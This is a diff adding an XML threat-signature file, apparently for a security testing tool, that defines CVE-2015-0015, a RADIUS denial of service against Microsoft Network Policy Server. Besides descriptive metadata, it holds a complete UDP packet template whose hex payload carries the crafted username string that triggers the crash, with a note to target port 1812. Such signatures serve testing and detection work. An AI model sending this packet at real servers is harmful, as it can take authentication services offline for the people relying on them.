@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Microsoft Network Policy Server RADIUS Denial of Service"/>
+    <EngDesc display="true" value="A denial of service vulnerability has been reported in Microsoft Network Policy Server. The vulnerability is due to an error in processing certain specially crafted username strings. A remote, unauthenticated attacker could exploit this vulnerability by sending specially crafted requests to the Network Policy Server. Successful exploitation could lead to a denial of service condition on the server. Tester should set $destPort to 1812 before test."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="RADIUS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Windows_Server"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="2003/2008/2008_R2/2012/2012_R2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20150113-11"/>
+    <CVEID display="true" value="CVE-2015-0015"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="9182bbabdb494e9a2103af327bb10994"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635576294347893120"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1422268214" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="B"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:0E:7F" destMac="00:50:56:B4:2D:D8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0040" Identification="964A" FragmentOffset="0000" TTL="40" Protocol="11" HeaderChecksum="7B33" srcIP="172.16.8.230" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="33729" destPort="$destPort" checksum="494F" length="002C" Payload="012D00241C7AFA69C9B4370999D115AE5D899B8B011074657374752A282A282929292929"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
